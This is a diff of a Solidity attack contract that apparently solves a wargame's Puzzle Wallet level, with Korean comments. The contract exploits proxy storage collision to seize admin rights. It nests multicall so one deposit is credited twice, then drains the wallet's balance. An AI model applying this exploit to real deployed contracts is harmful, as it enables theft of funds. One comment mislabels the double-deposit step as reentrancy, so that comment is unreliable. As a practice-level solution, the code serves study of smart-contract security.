@@ -1,10 +1,14 @@
-// SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.0;
 
-interface IPuzzleProxy {}
+interface IPuzzleProxy {
+    function proposeNewAdmin(address) external;
+}
 
 interface IPuzzleWallet {
     function balances(address) external view returns (uint256);
+
+    function addToWhitelist(address) external;
 
     function deposit() external payable;
 
@@ -15,44 +19,59 @@ interface IPuzzleWallet {
     ) external payable;
 
     function multicall(bytes[] calldata data) external payable;
+
+    function setMaxBalance(uint256) external;
 }
 
 contract PuzzleWalletAttack {
-    IPuzzleProxy immutable lv;
-    IPuzzleWallet immutable target;
+    address immutable _owner;
+    address immutable _target; // $LV: PuzzleProxy
+    bytes[] _dataMulticall;
 
-    constructor(address _lv, address _target) {
-        lv = IPuzzleProxy(_lv);
-        target = IPuzzleWallet(_target);
+    constructor(address target) {
+        _owner = msg.sender;
+        _target = target;
     }
 
-    /// @dev multicall -> [deposit -> execute] -> multicall ... 흐름을 반복하며 balances[msg.sender] >= target.balance를 만족할 때까지 에 대해 0.001 ether를 전달하는 동시에, 첫번째 data로 execute($LV2, 0.001ether, multicall(...)) 를 전달해야 한다.
-    function step1() external payable {
+    function attack() external payable {
         require(msg.value == 0.001 ether);
+        // 권한 우회
+        IPuzzleProxy(_target).proposeNewAdmin(address(this));
+        IPuzzleWallet(_target).addToWhitelist(address(this));
+        // reentrancy attack을 통해 잔고 0으로 만들기
+        _balanceToZero();
+        // 권한 탈취
+        IPuzzleWallet(_target).setMaxBalance(uint256(uint160(tx.origin)));
+    }
 
-        bytes memory _depositArgs = abi.encode(IPuzzleWallet.deposit.selector);
-
-        bytes memory _executeArgs = abi.encode(
-            IPuzzleWallet.execute.selector,
-            address(target),
-            0.001 ether,
-            IPuzzleWallet.multicall.selector
+    /// @dev multicall을 통해 [deposit, multicall[deposit]]을 수행하면 최초 multicall을 통해 0.001 ether이 전달된 상태에서 2번의 deposit을 수행할 수 있다.
+    function _balanceToZero() internal {
+        bytes memory argsDeposit = abi.encodeWithSelector(
+            IPuzzleWallet.deposit.selector
         );
 
-        bytes[] memory _multData = new bytes[](2);
-        _multData[0] = _depositArgs;
-        _multData[1] = _executeArgs;
+        _dataMulticall.push(argsDeposit);
 
-        while (true) {
-            (bool res, ) = address(target).call{value: 0.001 ether}(
-                abi.encode(IPuzzleWallet.multicall.selector, _multData)
-            );
-            if (
-                target.balances(address(this)) >= address(target).balance ||
-                !res
-            ) {
-                break;
-            }
-        }
+        bytes memory subArgsMulticall = abi.encodeWithSelector(
+            IPuzzleWallet.multicall.selector,
+            _dataMulticall // deposit only
+        );
+
+        _dataMulticall.push(subArgsMulticall);
+
+        bytes memory mainArgsMulticall = abi.encodeWithSelector(
+            IPuzzleWallet.multicall.selector,
+            _dataMulticall // deposit, multicall[deposit]
+        );
+
+        (bool res, ) = _target.call{value: 0.001 ether}(mainArgsMulticall);
+
+        require(
+            res &&
+                IPuzzleWallet(_target).balances(address(this)) >=
+                _target.balance
+        );
+
+        IPuzzleWallet(_target).execute(_owner, _target.balance, "");
     }
 }
